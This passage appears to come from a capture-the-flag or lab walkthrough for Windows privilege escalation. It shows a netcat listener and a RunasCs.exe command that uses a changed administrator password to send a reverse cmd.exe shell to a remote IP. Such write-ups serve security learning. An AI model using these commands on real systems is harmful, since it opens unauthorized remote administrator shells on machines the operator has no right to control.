
Either we login via the new changed password of administrator via evilwinrm or we use RunasCs.exe tool. I like to use the [RunasCs.exe](https://github.com/antonioCoco/RunasCs) tool.

Setup a listener on port 80 as observed. Run the below the RunasCs.exe tool using the new administrator changed password and get a shell as administrator on port 80.

So, just use RunasCs.exe from GitHub, it works great in addition to a built-in reverse shell with -r.

```
nc -lvnp 80
```

```
.\RunAs.exe administrator admin@123 cmd.exe -r 192.168.45.161:80
```